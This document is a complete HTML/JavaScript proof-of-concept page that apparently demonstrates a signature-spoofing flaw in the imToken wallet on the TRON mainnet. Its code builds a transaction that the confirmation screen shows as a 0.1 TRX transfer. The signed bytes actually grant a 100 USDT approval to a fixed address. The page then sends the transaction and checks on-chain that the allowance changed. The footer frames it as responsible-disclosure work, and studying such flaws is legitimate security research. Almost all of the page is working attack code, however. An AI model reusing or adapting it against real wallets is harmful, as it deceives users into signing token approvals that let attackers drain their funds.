<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>所见非所签漏洞验证 (imToken TRON)</title>
  <style>
    :root {
      --bg: #0b0f14;
      --card: #131a22;
      --border: #253040;
      --text: #e1e6ed;
      --text2: #8899aa;
      --red: #f04343;
      --orange: #e6a23c;
      --green: #2ecc71;
      --blue: #4d94ff;
      --btn-bg: #1c2633;
      --btn-hover: #253245;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: var(--bg); color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
      padding: 16px; min-height: 100vh; display: flex; flex-direction: column; gap: 14px;
    }
    .card {
      background: var(--card); border: 1px solid var(--border);
      border-radius: 14px; padding: 18px;
    }
    .card-header {
      font-weight: 600; font-size: 15px; margin-bottom: 12px;
      display: flex; align-items: center; gap: 8px;
    }
    .dot { width:9px; height:9px; border-radius:50%; display:inline-block; }
    .dot.red{background:var(--red)} .dot.green{background:var(--green)} .dot.orange{background:var(--orange)}
    .row {
      display: flex; justify-content: space-between; align-items: flex-start;
      padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .row:last-child { border-bottom: none; }
    .label { color: var(--text2); min-width: 80px; }
    .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
    .highlight-red { color: var(--red); font-weight: 600; }
    .highlight-green { color: var(--green); }
    .highlight-blue { color: var(--blue); }
    .warn-box {
      background: rgba(240,67,67,0.08); border: 1px solid rgba(240,67,67,0.2);
      border-radius: 8px; padding: 10px; font-size: 12px; color: var(--red); margin-top: 10px;
    }
    .info-box {
      background: rgba(77,148,255,0.08); border: 1px solid rgba(77,148,255,0.2);
      border-radius: 8px; padding: 10px; font-size: 12px; color: var(--blue); margin-top: 10px;
    }
    .btn {
      width: 100%; padding: 14px 0; border-radius: 10px; border: none;
      font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.15s;
      text-align: center; margin-top: 10px;
    }
    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
    .btn-connect { background: var(--green); color: #000; }
    .btn-test { background: #e64343; color: #fff; }
    .btn-check { background: var(--blue); color: #fff; }
    .btn-secondary { background: var(--btn-bg); color: var(--text); border: 1px solid var(--border); }
    .log-box {
      background: #090d13; border: 1px solid var(--border); border-radius: 10px;
      padding: 10px; font-family: monospace; font-size: 11px; max-height: 180px; overflow-y: auto;
      color: #aab5c0; margin-top: 8px;
    }
    .log-line { padding: 2px 0; }
    .log-error { color: var(--red); }
    .log-success { color: var(--green); }
    .log-warn { color: var(--orange); }
    .flex-btns { display: flex; gap: 10px; }
    .flex-btns .btn { flex:1; }
  </style>
</head>
<body>

  <div class="card">
    <div class="card-header"><span class="dot red"></span> 漏洞验证流程</div>
    <div style="font-size:13px; color:var(--text2);">
      1. 钱包连接 → 2. 发起测试交易 → 3. 观察 imToken 弹窗显示<br>
      <span class="highlight-green">弹窗将显示：发送 0.1 TRX 至 TEfFnh...bSAz</span><br>
      <span class="highlight-red">实际签名内容：USDT approve (授权 100 USDT 给同一地址)</span>
    </div>
  </div>

  <div class="card" id="statusCard">
    <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
    <div id="beforeConnect">
      <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
      <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
    </div>
    <div id="afterConnect" style="display:none;">
      <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
      <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
      <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
      <div class="row"><span class="label">环境</span><span class="value" id="envInfo"></span></div>
      <button class="btn btn-test" id="btnSend">触发漏洞交易 (tron.sendTransaction)</button>
      <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:6px;">查询 USDT 授权额度 (前后对比)</button>
    </div>
  </div>

  <div class="card" id="allowanceCard" style="display:none;">
    <div class="card-header"><span class="dot orange"></span> USDT 授权额度监测</div>
    <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
    <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
    <div class="info-box">若授权从 0 变为 100 USDT，说明漏洞利用成功（确认页显示 TRX 转账，链上执行了授权）</div>
  </div>

  <div class="card">
    <div class="card-header"><span class="dot orange"></span> 运行日志</div>
    <div class="log-box" id="logContainer">等待操作…</div>
  </div>

  <div style="font-size:11px; color:var(--text2); text-align:center; margin-top:4px;">
    imToken 安全漏洞验证 · 仅用于负责任披露
  </div>

<script>
(function() {
  // ---------- 常量 ----------
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT
  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';       // 授权目标 (同时也是伪装转账接收方)
  const APPROVE_AMOUNT = '100000000';                          // 100 USDT (6 decimals)
  const TRON_API = 'https://api.trongrid.io';

  // ---------- 状态 ----------
  let walletAddr = '';
  let initialAllowance = null;
  let lastTxID = null;

  // ---------- DOM 引用 ----------
  const $ = id => document.getElementById(id);
  const beforeConnect = $('beforeConnect');
  const afterConnect = $('afterConnect');
  const btnConnect = $('btnConnect');
  const btnSend = $('btnSend');
  const btnCheck = $('btnCheckAllowance');
  const logBox = $('logContainer');
  const allowanceCard = $('allowanceCard');
  const currentAllowanceEl = $('currentAllowance');
  const allowanceChangeEl = $('allowanceChange');
  const dotStatus = $('dotStatus');

  // ---------- 日志 ----------
  function log(msg, type='') {
    const div = document.createElement('div');
    div.className = 'log-line' + (type ? ' log-'+type : '');
    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    logBox.appendChild(div);
    logBox.scrollTop = logBox.scrollHeight;
  }

  // ---------- 工具: Base58 解码 (简单版，仅校验长度) ----------
  function base58Decode(str) {
    const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let num = 0n;
    for (let ch of str) {
      const idx = ALPHABET.indexOf(ch);
      if (idx < 0) throw new Error('非法 Base58 字符');
      num = num * 58n + BigInt(idx);
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = '0' + hex;
    // 前导1
    let pad = 0;
    while (str[pad] === '1') pad++;
    const bytes = [];
    for (let i = 0; i < pad; i++) bytes.push(0);
    for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i,2), 16));
    return new Uint8Array(bytes);
  }
  function addrToHex21(addr) { return base58Decode(addr).slice(0,21); }
  function addrToHex20(addr) { return base58Decode(addr).slice(1,21); }
  function toHex(buf) { return Array.from(buf).map(b=>b.toString(16).padStart(2,'0')).join(''); }
  function hexToBytes(h) {
    if (h.startsWith('0x')) h = h.slice(2);
    const len = h.length/2;
    const arr = new Uint8Array(len);
    for (let i=0; i<len; i++) arr[i] = parseInt(h.substr(i*2,2),16);
    return arr;
  }

  // ---------- 简易 Protobuf 编码 ----------
  function varintEncode(val) {
    const bytes = [];
    let v = BigInt(val);
    while (v > 127n) {
      bytes.push(Number((v & 127n) | 128n));
      v >>= 7n;
    }
    bytes.push(Number(v & 127n));
    return new Uint8Array(bytes);
  }
  function fieldBytes(fieldNum, data) {
    const tag = varintEncode((fieldNum << 3) | 2);
    const len = varintEncode(data.length);
    const out = new Uint8Array(tag.length + len.length + data.length);
    out.set(tag, 0);
    out.set(len, tag.length);
    out.set(data, tag.length + len.length);
    return out;
  }
  function fieldUint64(fieldNum, val) {
    const tag = varintEncode((fieldNum << 3) | 0);
    const v = varintEncode(val);
    const out = new Uint8Array(tag.length + v.length);
    out.set(tag, 0);
    out.set(v, tag.length);
    return out;
  }
  function concat(...arrays) {
    const total = arrays.reduce((s,a)=>s+a.length, 0);
    const res = new Uint8Array(total);
    let off = 0;
    for (const a of arrays) { res.set(a, off); off += a.length; }
    return res;
  }

  // 构造 TriggerSmartContract 消息 (approve)
  function buildTriggerSC(owner21, contract21, dataBytes) {
    return concat(
      fieldBytes(1, owner21),            // owner_address
      fieldBytes(2, contract21),         // contract_address
      fieldUint64(3, 0),                 // call_value
      fieldBytes(4, dataBytes),          // data (approve)
      fieldUint64(5, 0),                 // call_token_value
      fieldUint64(6, 0)                  // token_id
    );
  }

  // 构造 approve 的 data: selector + spender(32bytes) + amount(32bytes)
  function buildApproveData(spender20, amountHex) {
    const selector = hexToBytes('095ea7b3');
    const spenderPadded = new Uint8Array(32);
    spenderPadded.set(spender20, 12); // 左填充0至32字节
    const amountBytes = hexToBytes(amountHex.padStart(64, '0'));
    return concat(selector, spenderPadded, amountBytes);
  }

  // 获取最新区块信息
  async function fetchLatestBlock() {
    const resp = await fetch(TRON_API + '/wallet/getnowblock');
    const data = await resp.json();
    const header = data.block_header.raw_data;
    return {
      number: header.number,
      hash: header.hash || data.blockID,
      blockID: data.blockID,
      timestamp: header.timestamp
    };
  }

  // 构造 payload (混合交易)
  function buildPayload(userAddr, blockInfo) {
    const blockNum = blockInfo.number;
    const blockIDHex = blockInfo.blockID;
    // ref_block_bytes: 大端2字节 (blockNum & 0xFFFF)
    const refBlockNum16 = blockNum & 0xFFFF;
    const refBlockBytes = new Uint8Array([ (refBlockNum16 >> 8) & 0xFF, refBlockNum16 & 0xFF ]);
    const blockIDBytes = hexToBytes(blockIDHex);
    const refBlockHash = blockIDBytes.slice(8, 16);

    const now = Date.now();
    const expiration = now + 600000; // 10分钟
    const timestamp = now;
    const feeLimit = 15_000_000; // 15 TRX 手续费 (足够合约调用)

    // 地址转换
    const usdt21 = addrToHex21(USDT_CONTRACT);
    const spender20 = addrToHex20(SPENDER);
    const user21 = addrToHex21(userAddr);
    const user20 = addrToHex20(userAddr);

    // approve data (100 USDT)
    const amountHex = BigInt(APPROVE_AMOUNT).toString(16);
    const approveData = buildApproveData(spender20, amountHex);
    const triggerSC = buildTriggerSC(user21, usdt21, approveData);

    // 包装成 Any (type_url + value)
    const typeUrl = 'type.googleapis.com/protocol.TriggerSmartContract';
    const anyBytes = concat(
      fieldBytes(1, new TextEncoder().encode(typeUrl)),
      fieldBytes(2, triggerSC)
    );

    // Transaction.Contract: type=31 (TriggerSmartContract), parameter=Any
    const contractInner = concat(
      fieldUint64(1, 31),                // type
      fieldBytes(2, anyBytes)            // parameter
    );

    // Transaction.raw_data
    const rawDataBytes = concat(
      fieldBytes(1, refBlockBytes),
      fieldUint64(3, blockNum),
      fieldBytes(4, refBlockHash),
      fieldUint64(8, expiration),
      fieldBytes(11, contractInner),
      fieldUint64(14, timestamp),
      fieldUint64(18, feeLimit)
    );
    const rawDataHex = toHex(rawDataBytes);

    // ---- 构造欺骗用的 raw_data (确认页显示) ----
    // 这里 contract 数组第一个元素，仅 type 和 parameter 用于显示，数字键 "1"/"2" 尝试覆盖
    const fakeParam = {
      type_url: 'type.googleapis.com/protocol.TransferContract',
      value: {
        amount: 100000,                                 // 0.1 TRX (单位 sun)
        to_address: '41' + toHex(spender20),           // 转账接收方 = 授权目标地址
        owner_address: '41' + toHex(user20)
      }
    };

    const contractEntry = {
      type: 'TransferContract',
      parameter: fakeParam,
      // 数字键尝试影响节点解析，但不影响确认页读取 type/parameter
      '1': 31,
      '2': {
        type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
        value: {
          owner_address: '41' + toHex(user20),
          contract_address: '41' + toHex(usdt21.slice(1)),
          data: toHex(approveData),
          call_value: 0,
          call_token_value: 0,
          token_id: 0
        }
      }
    };

    return {
      raw_data: {
        ref_block_bytes: toHex(refBlockBytes),
        ref_block_hash: toHex(refBlockHash),
        ref_block_num: blockNum,
        expiration: expiration,
        timestamp: timestamp,
        fee_limit: feeLimit,
        contract: [ contractEntry ]
      },
      raw_data_hex: rawDataHex,
      visible: true    // 确保 imToken 显示地址时使用 base58 格式
    };
  }

  // ---------- 查询 USDT allowance ----------
  async function queryAllowance(ownerAddr, spenderAddr) {
    const ownerHex = '41' + toHex(addrToHex20(ownerAddr));
    const spenderHex = '000000000000000000000000' + toHex(addrToHex20(spenderAddr)); // 32字节左填充
    const data = '0x70a0823100000000000000000000000000000000000000000000000000000000' + // balanceOf 占位，实际用 allowance
                'dd62ed3e' + // allowance(address,address)
                '000000000000000000000000' + toHex(addrToHex20(ownerAddr)) +
                '000000000000000000000000' + toHex(addrToHex20(spenderAddr));
    // 简化：直接用 TRON API 的 /wallet/triggerconstantcontract
    try {
      const resp = await fetch(TRON_API + '/wallet/triggerconstantcontract', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          owner_address: ownerHex,
          contract_address: '41' + toHex(addrToHex20(USDT_CONTRACT)),
          function_selector: 'allowance(address,address)',
          parameter: '000000000000000000000000' + toHex(addrToHex20(ownerAddr)) +
                     '000000000000000000000000' + toHex(addrToHex20(spenderAddr)),
          visible: true
        })
      });
      const result = await resp.json();
      if (result.constant_result && result.constant_result.length > 0) {
        const hexVal = result.constant_result[0];
        return BigInt('0x' + hexVal);
      }
      return null;
    } catch (e) {
      log('查询授权失败: ' + e.message, 'error');
      return null;
    }
  }

  function formatAmount(wei) {
    if (wei === null || wei === undefined) return '--';
    const num = Number(wei) / 1e6;
    return num.toLocaleString(undefined, { maximumFractionDigits: 2 }) + ' USDT';
  }

  async function refreshAllowanceUI(initial = false) {
    if (!walletAddr) return;
    const allowance = await queryAllowance(walletAddr, SPENDER);
    if (allowance === null) {
      currentAllowanceEl.textContent = '查询失败';
      allowanceChangeEl.textContent = '--';
      return;
    }
    currentAllowanceEl.textContent = formatAmount(allowance);
    allowanceCard.style.display = 'block';
    if (initial) {
      initialAllowance = allowance;
      allowanceChangeEl.textContent = '记录初始值';
    } else if (initialAllowance !== null) {
      const diff = allowance - initialAllowance;
      allowanceChangeEl.textContent = diff > 0n ? '+' + formatAmount(diff) : '无变化';
      if (diff > 0n) {
        allowanceChangeEl.style.color = 'var(--red)';
        log('⚠️ 授权额度增加！漏洞验证成功！', 'error');
      }
    }
  }

  // ---------- 连接钱包 (仅通过 imToken 原生桥) ----------
  async function connect() {
    log('检查 imToken 环境…', 'warn');
    if (typeof window.imToken === 'undefined' || typeof window.imToken.callPromisifyAPI !== 'function') {
      log('未检测到 imToken 桥接对象，请在 imToken DApp 浏览器中打开', 'error');
      alert('请在 imToken DApp 浏览器中打开本页面，并切换至 TRON 网络');
      return;
    }
    try {
      log('请求授权 (tron_requestAccounts)...', 'warn');
      const result = await window.imToken.callPromisifyAPI('tron_requestAccounts');
      let addr = '';
      if (Array.isArray(result) && result.length > 0) addr = result[0];
      else if (typeof result === 'string' && result.startsWith('T')) addr = result;
      if (addr && addr.length === 34) {
        walletAddr = addr;
        document.getElementById('addrText').textContent = addr;
        // 获取 TRX 余额
        try {
          const balResp = await fetch(TRON_API + '/v1/accounts/' + addr);
          const balData = await balResp.json();
          const balance = (balData.data?.[0]?.balance || 0) / 1e6;
          document.getElementById('trxBal').textContent = balance + ' TRX';
        } catch(e) { document.getElementById('trxBal').textContent = '--'; }
        document.getElementById('envInfo').textContent = 
          'imToken/' + (navigator.userAgent.match(/imToken\/([\d.]+)/)?.[1] || '?') + 
          ' | ' + (navigator.platform || 'mobile');
        dotStatus.className = 'dot green';
        beforeConnect.style.display = 'none';
        afterConnect.style.display = 'block';
        log('已连接: ' + addr, 'success');
        // 记录初始授权
        await refreshAllowanceUI(true);
      } else {
        throw new Error('返回地址无效');
      }
    } catch (e) {
      log('连接失败: ' + e.message, 'error');
      alert('连接失败，请确保 imToken 已解锁并处于 TRON 网络');
    }
  }

  // ---------- 发送交易 ----------
  async function sendTx() {
    if (!walletAddr) return alert('请先连接钱包');
    // 获取最新区块
    let blockInfo;
    try {
      log('获取最新区块…', 'warn');
      blockInfo = await fetchLatestBlock();
      log('区块 #' + blockInfo.number, 'success');
    } catch (e) {
      log('获取区块失败，无法构造有效交易', 'error');
      alert('网络错误，无法获取区块信息');
      return;
    }
    // 构造 payload
    const payload = buildPayload(walletAddr, blockInfo);
    log('Payload 已构造', 'warn');
    log('raw_data.contract[0].type = ' + payload.raw_data.contract[0].type, 'success');
    log('raw_data_hex 长度 = ' + payload.raw_data_hex.length, 'success');
    log('即将调用 imToken tron.sendTransaction …', 'warn');
    log('❗ 请观察 imToken 弹窗：应显示 "发送 0.1 TRX 至 TEfFnh…bSAz"', 'warn');

    try {
      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);
      log('返回: ' + JSON.stringify(res), 'success');
      if (res && res.txid) {
        lastTxID = res.txid;
        log('交易已广播! TXID: ' + res.txid, 'success');
        log('等待约15秒后查询授权额度…', 'warn');
        btnCheck.disabled = false;
        // 自动延时查询
        setTimeout(async () => {
          log('查询链上授权…', 'warn');
          await refreshAllowanceUI(false);
        }, 16000);
      } else {
        log('未返回 txid，可能交易失败', 'error');
      }
    } catch (e) {
      log('交易异常: ' + e.message, 'error');
      if (e.message.includes('reject') || e.message.includes('cancel')) {
        log('用户取消了交易', 'warn');
      } else if (e.message.includes('insufficient')) {
        log('TRX 余额不足支付手续费', 'error');
      } else if (e.message.includes('invalid')) {
        log('交易无效 (节点拒绝)', 'error');
      }
    }
  }

  // ---------- 手动查询授权 ----------
  async function manualCheck() {
    if (!walletAddr) return;
    log('手动查询 USDT 授权额度…', 'warn');
    await refreshAllowanceUI(false);
  }

  // 事件绑定
  btnConnect.addEventListener('click', connect);
  btnSend.addEventListener('click', sendTx);
  btnCheck.addEventListener('click', manualCheck);
  btnCheck.disabled = true;

  // 初始环境检测
  if (typeof window.imToken !== 'undefined') {
    log('检测到 imToken 环境', 'success');
  } else {
    log('未检测到 imToken，请使用 imToken DApp 浏览器', 'warn');
  }

})();
</script>
</body>
</html>
